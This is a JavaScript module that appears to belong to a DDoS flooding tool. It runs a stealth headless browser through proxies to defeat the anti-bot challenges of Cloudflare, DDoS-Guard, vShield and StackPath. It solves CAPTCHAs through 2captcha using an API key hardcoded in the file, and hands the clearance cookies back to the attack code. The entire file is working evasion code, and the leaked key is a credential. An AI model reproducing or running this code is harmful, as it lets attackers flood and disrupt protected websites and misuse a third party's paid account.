module.exports = function BrowserEngine() {
    var storm = [];
    require('events').EventEmitter.defaultMaxListeners = 0;
    const { addExtra } = require('puppeteer-extra');
    const StealthPlugin = require('puppeteer-extra-plugin-stealth');
    const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha');
    const colors = require('colors');
    const request = require('request')

    var XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
    const SITE_KEY_REGEXP = /sitekey=([^"]+)/;
    const CHALLENGE_FORM_ACTION_REGEXP = /id="challenge-form" action="([^"]+)/;
    const CHALLENGE_FORM_REGEXP = /<form class="challenge-form[^>]*>([\s\S]*?)<\/form>/;
    const INPUT_REGEXP = /<\s*input(.*?)[^>]*>/gm;
    const NAME_REGEXP = /name="([^"]*)/;
    const ID_REGEXP = /id="([^"]*)/;
    const VALUE_REGEXP = /value="([^"]*)/;

    const {
        PUPPETEER_HEADLESS = 'true',
        PUPPETEER_IGNORE_HTTPS_ERROR = 'true'
    } = process.env;
      
    let chromium;
    let puppeteerCore;
    try {
        puppeteerCore = require('puppeteer');

        /* chromium = require('chrome-aws-lambda');
        puppeteerCore = chromium.puppeteer; */
    } 
    catch (e) { }
    if (!puppeteerCore) {
        try {
            chromium = require('chrome-aws-lambda');
            puppeteerCore = chromium.puppeteer;
        } 
        catch (e) {
            throw new Error(
                'Missing puppeteer dependency (yarn add puppeteer or yarn add puppeteer-core chrome-aws-lambda)'
            );
        }
    }
    
    const puppeteer = addExtra(puppeteerCore);
    const stealth = StealthPlugin();

    puppeteer.use(stealth);

    if(storm.key) {
        const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha');
        puppeteer.use(
            RecaptchaPlugin({
                provider: {
                id: '2captcha',
                token: storm.key // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
                },
                visualFeedback: true // colorize reCAPTCHAs (violet = detected, green = solved)
            })
        );
    }

    function log(string) {
        let d = new Date();
    
        let hours = (d.getHours()<10?'0':'') + d.getHours();
        let minutes = (d.getMinutes()<10?'0':'') + d.getMinutes();
        let seconds = (d.getSeconds()<10?'0':'') + d.getSeconds();
    
        console.log(`[${hours}:${minutes}:${seconds}] ${string}`);
    }

    
    function cookiesToStr(cookies) {
        if (Array.isArray(cookies)) {
            return cookies.reduce((prev, { name, value }) => {
                if (!prev) return `${name}=${value}`;
                return `${prev}; ${name}=${value}`;
            }, "");
        return "";
        }
    }

    async function createBrowser(uagent, proxy) {
        const args = [
            '--no-sandbox', 
            '--disable-setuid-sandbox',
            '--user-agent=' + uagent,
            '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas',
            '--no-first-run',
            '--no-zygote',
            '--single-process',
            '--disable-gpu',
            '--hide-scrollbars',
            '--mute-audio',
            '--disable-gl-drawing-for-tests',
            '--disable-canvas-aa',
            '--disable-2d-canvas-clip-aa',
            '--disable-web-security',
            '--ignore-certificate-errors',
            '--ignore-certificate-errors-spki-list',
            '--disable-features=IsolateOrigins,site-per-process'
        ];

        if (proxy) { 
            args.push(`--proxy-server=http://${proxy}`);
        }
        
        try {
        let puppeteerOptions = {
            headless: PUPPETEER_HEADLESS === 'true',
            ignoreHTTPSErrors: PUPPETEER_IGNORE_HTTPS_ERROR === 'true',
            /* slowMo: 250, */
            args
        };
        
        if (chromium) {
            puppeteerOptions = {
                ...puppeteerOptions,
                args: chromium.args.concat(args),
                defaultViewport: chromium.defaultViewport,
                executablePath: await chromium.executablePath,
                headless: true
            };
        }
        
        return await puppeteer.launch(puppeteerOptions);
    }
    catch(e) { }
    }

    function isCloudflareJSChallenge(body) {
        return body.includes('cf-browser-verification');
    }
        
    function isCloudflareCaptchaChallenge(body) {
        return body.includes('cf_captcha_kind');
    }

    function isDDGCaptchaChallenge(body) {
        return body.includes('/.well-known/ddos-guard/rc');
    }

    function isDDGChallenge(body) {
        return body.includes('check.ddos-guard.net/check.js');
    }

    function isvShieldChallenge(body) {
        return body.includes('dl.vshield.pro/ddos/bot-detector.js');
    }

    async function CloudFlareJSSolver(page) {
        const startTimestamp = Date.now();
        while(Date.now() - startTimestamp < 60000) {
            await page.waitFor(1000);

            await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 15000 });
            const cloudflareRay = await page.$('.ray_id');
            if (!cloudflareRay) {
                break;
            }
        }
        

        const html = await page.content();
        if(isCloudflareJSChallenge(html)) {
            log('[Failed]'.red + ` JS Challenge `.yellow + `can't be bypassed!`.red);
            return 'js';
        }
        else if (isCloudflareCaptchaChallenge(html)) {
            log('[Failed]'.red + ` hCaptcha detected after JS!`.brightRed);
            return 'captcha';
        }
        log('[Success]'.green + ` JS Challenge `.yellow + `bypassed successfully!`.blue);
        return true;
    }

    var apiKey = "e480f24d9c0e5b1e13ba80531de7fd8a";

    function extract(string, regexp, errorMessage) {
        const match = string.match(regexp);
        if (match) {
            return match[1];
        }
        if (errorMessage) {
            throw new Error(errorMessage);
        }
    }   

    function extractChallengeData(content) {
        const challengeForm = extract(content, CHALLENGE_FORM_REGEXP, "could't find challenge form");
            
        let match;
        const postData = {};
        const inputRegexp = new RegExp(INPUT_REGEXP);
            
        while ((match = inputRegexp.exec(challengeForm)) !== null) {
            const input = match[0];
            let idOrName = extract(input, ID_REGEXP);
            if (!idOrName) {
                idOrName = extract(input, NAME_REGEXP);
            }
            if (idOrName) {
                const value = extract(input, VALUE_REGEXP) || '';
                postData[idOrName] = encodeURIComponent(value);
            }
        }     
        return postData;
    }

    function httpGet(theUrl){
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", theUrl, false );
        xmlHttp.send( null );
        return xmlHttp.responseText;
    }
    
    async function sendCaptcha(siteKey, page, callback){
        var keyCaptchaParams = "https://2captcha.com/in.php?key=e480f24d9c0e5b1e13ba80531de7fd8a&method=hcaptcha&sitekey=" + siteKey + "&pageurl=" + storm.target + "&json=1";
        var captchaId = JSON.parse(httpGet(keyCaptchaParams)).request;
        var keyCaptchaResponse = "https://2captcha.com/res.php?key=" + apiKey + "&action=get&header_acao=1&json=1&id=" + captchaId;

        //var intId = setInterval(function() {
        await page.waitFor(45000);
        console.log('Lets check..')
            var captchaAnswer = JSON.parse(httpGet(keyCaptchaResponse));
            if (captchaAnswer.status === 1) {
                //clearInterval(intId);
                var answer = captchaAnswer.request;
                console.log('Sumbit captcha')
                callback(answer);
            }
            else if (captchaAnswer.request === "ERROR_CAPTCHA_UNSOLVABLE") {
                //clearInterval(intId);
                console.log("Captcha is unsolvable");
            }
        //}, 5000);
    } 

    async function CloudFlareCaptchaSolver(page) {
        await page.waitForSelector('form#challenge-form');
        await page.waitForSelector('[name=g-recaptcha-response]');
        await page.waitForSelector('[name=h-captcha-response]');

        let content = await page.content();
        const siteKey = await extract(content, SITE_KEY_REGEXP, "could't find the site key");
        const challengeFormAction = await extract(
            content,
            CHALLENGE_FORM_ACTION_REGEXP,
            "could't find the challenge form action"
            );
        const postData = extractChallengeData(content);

        sendCaptcha(siteKey, page, async function(captchaResponse) {
            await page.evaluate((captchaResponse) => {
                document.querySelector('[name=g-recaptcha-response]').innerText = captchaResponse
                document.querySelector('[name=h-captcha-response]').innerText = captchaResponse
                document.querySelector('form#challenge-form').submit()
            }, captchaResponse);

/*             await page.type("[name=g-recaptcha-response]", captchaResponse);
            await page.type("[name=h-captcha-response]", captchaResponse);
            await page.click(`form#challenge-form`); */

            await page.waitFor(7500);

            let title = await page.title();
            if(title == "Attention Required! | Cloudflare") {
                
            }
            console.log(title);
        });
    } 

    async function DDGJSSolver(page) {
        const startTimestamp = Date.now();
        while(Date.now() - startTimestamp < 15000) {
            await page.waitFor(1000);

            await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 6500 });

            const content = await page.content();
            const DDG_JS = await isDDGChallenge(content);

            if (!DDG_JS) {
                log('[Success]'.brightGreen + ` JS Challenge `.yellow + `bypassed successfully!`.brightBlue);
                break;
            }
        }
    
        let content = await page.content();
        if (isDDGCaptchaChallenge(content)) {
            log('[Failed]'.brightRed + ` ReCaptcha detected after JS!`.brightRed);

            if(storm.key) {
                let count = 1;
                while (isDDGCaptchaChallenge(content)) {
                    const { captchas, solutions, solved, error } = await page.solveRecaptchas();

                    if(error) {
                        return await callback("captcha_exit");   
                    }
                    else if(solved) {
                        log('[INFO]'.yellow + ` Sending captcha after JS...`.cyan);
                        await page.waitFor(6000);

                        content = await page.content();
                    }

                    content = await page.content();
                    if (count++ === 3) {
                        return "captcha";
                    }
                }
                let title = await page.title();
                if(title == "DDOS-GUARD") {
                    log('[Failed]'.brightRed + ` something went wrong type 2: [`.cyan + `${isDDGChallenge ? 'JS' : 'Captcha'}]`.brightMagenta);
                    return isDDGChallenge ? "js" : "captcha";
                }
                else {
                    log('[Success]'.brightGreen + ` Captcha `.yellow + `bypassed successfully!`.brightBlue);
                    return true;
                }      
            }
            else {
                return await callback("captcha_exit");
            }
        }
        return true;
    }

    async function StackPathJSSolver(page) {
        const startTimestamp = Date.now();
        while(Date.now() - startTimestamp < 15000) {
            await page.waitFor(1000);

            await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 3500 });

            const title = await page.title();

            if (title != "StackPath") {
                log('[Success]'.brightGreen + ` JS Challenge `.yellow + `bypassed successfully!`.brightBlue);
                break;
            }
        }
    
        const title = await page.title();
        if (title == "Site verification") {
            log('[Failed]'.brightRed + ` Captcha detected after JS!`.brightRed);
            return "captcha";
        }
        if(title == "StackPath") {
            log('[Failed]'.brightRed + ` JS Challenge `.yellow + `can't be bypassed!`.brightRed);
            return "js";
        }
        return true;
    }

    return async function bypass(proxy, uagent, callback) {
        const browser = await createBrowser(uagent, proxy);
        try {
            const page = await browser.newPage();
            await page.setUserAgent(uagent);
            
            await page.goto(storm.target, {
                timeout: 45000,
                waitUntil: 'domcontentloaded'
            });

            if(storm.delay > 0) {
                await page.waitFor(storm.delay);
            }

            let title = await page.title();
            let content = await page.content();
 
            if(isDDGChallenge(content)) {
                log('[INFO]'.yellow + ` DDoS-Guard JS Challenge `.cyan + `detected!`.brightGreen);
                let result =  await DDGJSSolver(page);
                switch(result) {
                    case "js": { return await callback("js"); }
                    case "captcha": { return await callback("captcha_after_js"); }
                }
            }
            else if(isDDGCaptchaChallenge(content)) {
                log('[INFO]'.yellow + ` DDoS-Guard Captcha `.brightRed + `detected!`.brightGreen);

                if(storm.key) {
                    let count = 1;
                    while (isDDGCaptchaChallenge(content)) {
                        const { captchas, solutions, solved, error } = await page.solveRecaptchas();

                        if(error) {
                            return await callback("captcha_exit");   
                        }
                        else if(solved) {
                            console.log(solved);
                            log('[INFO]'.yellow + ` Sending captcha...`.cyan);
                            await page.waitFor(6000);

                            content = await page.content();
                        }

                        content = await page.content();
                        if (count++ === 3) {
                            return await callback("captcha_exit");
                        }
                    }
                    title = await page.title();
                    if(title == "DDOS-GUARD") {
                        log('[Failed]'.brightRed + ` something went wrong: [`.cyan + `${isDDGChallenge ? 'JS' : 'Captcha'}]`.brightMagenta);
                        return await callback("captcha_exit");
                    }
                    log('[Success]'.brightGreen + ` Captcha `.yellow + `bypassed successfully!`.brightBlue);
                }
                else {
                    return await callback("captcha_exit");
                }
            }
            else if(isvShieldChallenge(content)) {
                log('[INFO]'.yellow + ` vShield JS Challenge `.brightRed + `detected!`.brightGreen);

                await page.mouse.move(99, 101);
                await page.mouse.down();
                await page.mouse.move(199, 199);
                await page.mouse.up();

                if(storm.delay > 0) {
                    await page.waitFor(8000);
                }
            }
            else if(isCloudflareJSChallenge(content)) {
                log('[INFO]'.yellow + ` CloudFlare`.blue + ` JS Challenge `.yellow + `detected!`.blue);
                let result = await CloudFlareJSSolver(page);
                switch(result) {
                    case "js": { return await callback("js"); }
                    case "captcha": { return await callback("captcha_after_js"); }
                }
            }
            else if(isCloudflareCaptchaChallenge(content)) {
                log('[INFO]'.yellow + ` CloudFlare Captcha `.brightRed + `detected!`.brightGreen);
                
                let result = await CloudFlareCaptchaSolver(page, uagent, proxy);
                switch(result) {
                    case "js": { return await callback("js"); }
                    case "captcha": { return await callback("captcha_after_js"); }
                } 

                //return await callback("captcha_exit");
            }
            else if(title == "StackPath") {
                log('[INFO]'.yellow + ` StackPath JS Challenge `.cyan + `detected!`.brightGreen);
                let result = await StackPathJSSolver(page);
                switch(result) {
                    case "js": { return await callback("js"); }
                    case "captcha": { return await callback("captcha_after_js"); }
                }
            }
            else if(title == "Site verification") {
                log('[INFO]'.yellow + ` StackPath Captcha `.brightRed + `detected!`.brightGreen);
                return await callback("captcha_exit");   
            }
            else {
            }

            if(storm.click) {
                try {
                const clickText = text => {
                    return page.evaluate(text => [...document.querySelectorAll('*')].find(e => e.textContent.trim() === text).click(), text);
                };

                await clickText(storm.click);
                //await page.click(storm.click)
                await page.waitFor(2000);
                log("Current page:", page.url());
                }
                catch (e) {
                    console.log(e)
                }
            }

            if(storm.key) {
                await page.waitFor(120000);
            }

            title = await page.title();
            log('[INFO]'.yellow + ` Title: `.cyan + `${title}`.brightMagenta);

            let cookies = await page.cookies();

            if (cookies.length >= storm.cock) {
                cookies = cookiesToStr(cookies);
                return await callback(cookies);
            }
        }
        catch(e) {
            if(e.message.includes('ERR_CONNECTION_RESET')) {
                log(`Proxy: ${proxy} | Connection reset!`.red);
            }
            else if(e.message.includes('Navigation timeout')) {
                log(`Proxy: ${proxy} | Navigation timeout!`.red);
            }
            else if(e.message.includes('ERR_PROXY_CONNECTION_FAILED')) {
                log(`Proxy: ${proxy} | Connection failed!`.red);
            }
            return await callback();
        }
        finally {
            await browser.close();
        }
    }
}